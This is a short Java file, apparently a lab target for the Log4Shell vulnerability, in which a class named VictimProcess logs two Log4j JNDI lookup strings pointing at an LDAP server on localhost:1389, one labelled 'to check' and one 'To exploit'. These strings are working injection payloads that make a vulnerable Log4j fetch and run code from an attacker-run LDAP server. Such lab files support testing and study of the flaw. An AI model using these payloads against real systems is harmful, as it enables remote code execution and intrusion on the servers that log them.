package target;



import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VictimProcess {
	
	private static Logger logger = LogManager.getLogger(VictimProcess.class);
	
	public static void main(String... args) {
		//to check
		logger.error("${jndi:ldap://localhost:1389/a}");
		
		//To exploit
		logger.error("${jndi:ldap://localhost:1389/exe}");
	}

}
